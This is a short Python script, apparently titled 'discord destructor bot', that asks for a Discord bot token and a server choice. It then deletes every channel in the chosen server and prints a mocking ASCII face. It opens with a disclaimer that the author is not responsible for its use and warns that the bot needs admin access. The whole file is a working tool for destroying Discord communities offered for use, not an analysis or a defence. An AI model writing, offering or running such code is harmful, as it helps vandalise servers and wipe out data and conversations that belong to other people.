import discord
import sys
import asyncio
from discord import message
from discord import guild
from colorama import init
import colorama
from termcolor import colored
init()
print('author of script is not responsible for your actions.')
txt ="""
█▀▄ █▀▀ ▄▀▀ ▀█▀ █▀▀▄ ▄▀▄ ▀▄░▄▀ █▀▀ █▀▀▄  
█░█ █▀▀ ░▀▄ ░█░ █▐█▀ █░█ ░░█░░ █▀▀ █▐█▀ 
▀▀░ ▀▀▀ ▀▀░ ░▀░ ▀░▀▀ ░▀░ ░░▀░░ ▀▀▀ ▀░▀▀ 
"""
txt1 = """
██▀▄ ▀▄░▄▀     █░░ █░█ █▄░▄█ ▀ █▀▀ █▀▀▄ █▀▀ 
██▀█ ░░█░░     █░▄ █░█ █░█░█ █ █▀▀ █▐█▀ █▀▀ 
▀▀▀░ ░░▀░░     ▀▀▀ ░▀░ ▀░░░▀ ▀ ▀▀▀ ▀░▀▀ ▀▀▀ 
"""

def out_red(text):
    print(colored(text, 'red'))
def out_yellow(text):
    print("\033[33m {}" .format(text))
def out_blue(text):
    print("\033[34m {}" .format(text))

def out_pink(text):
    print("\033[35m {}" .format(text))
def out_green(text):
    print(colored(text, 'green'))

out_blue(txt)
out_blue(txt1)
out_yellow('Welcome to discord destructor bot!! made with love.')
out_red('Warning! This program is dangerous. Your bot must have admin access!!!')
out_pink('Enter your bot TOKEN https://discordapp.com/developers/applications/')
out_pink('Alt + Space   -> edit -> paste')
TOKEN = input('>>>')
out_blue('Loading...')
class MyClient(discord.Client):
    async def on_ready(self):
        out_yellow('logged as')
        out_yellow(self.user)
        print('\n')
        out_blue('DISCORD servers(guilgs) your bot in:')
        guilds = list(client.guilds)
        i = 0
        for guild in guilds:
            out = guild.name + ' | Number: ' + str(i)
            out_green(out)
            i += 1
        print('----------------------------------------------------------')
        out_pink('Input Number of server(guild) you want to destroy channels')
        b = int(input('>>>'))
        guild = guilds[b]
        out_red('DELETING STARTED...')
        channel_list = guild.channels
        for channel in channel_list:
            await channel.delete()
        out_red('DELETING COMPLETE.')
        txt = """
░░██████░░░░░░░░░░░░░░░░██████░░
████░░░░████░░░░░░░░████░░░░████
████░░░░░░░░██░░░░██░░░░░░░░████
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░██████░░░░░░░░██████░░░░░░
░░░░██░░░░████░░░░████░░░░██░░░░
░░░░░░░░██░░██░░░░██░░██░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░████░░░░░░░░░░░░██████░░░░
░░░░░░░░░░██████████████░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        """
        out_red(txt)
        await asyncio.sleep(1)
        sys.exit()

client = MyClient()
client.run(TOKEN)
